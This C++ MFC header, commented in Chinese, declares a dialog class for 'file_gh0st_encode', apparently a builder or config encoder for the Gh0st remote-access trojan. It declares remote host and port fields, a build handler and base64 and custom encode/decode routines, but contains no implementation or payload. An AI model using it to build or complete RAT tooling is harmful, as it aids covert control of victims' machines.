
// file_gh0st_encodeDlg.h: 头文件
//

#pragma once


// Cfilegh0stencodeDlg 对话框
class Cfilegh0stencodeDlg : public CDialog
{
// 构造
public:
	Cfilegh0stencodeDlg(CWnd* pParent = nullptr);	// 标准构造函数

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_FILE_GH0ST_ENCODE_DIALOG };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持


// 实现
protected:
	HICON m_hIcon;

	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
	CString m_remote_host;
	CString m_remote_port;
	afx_msg void OnBnBuild();
	int base64_encode(const void *data, int size, char **str);
	char * MyEncode(char *str);
	CString m_encode;
	CString m_decode;
	afx_msg void OnBnGetLoginInfo();
	int pos(char c);
	int base64_decode(const char *str, char **data);
	char* MyDecode(char *str);
};
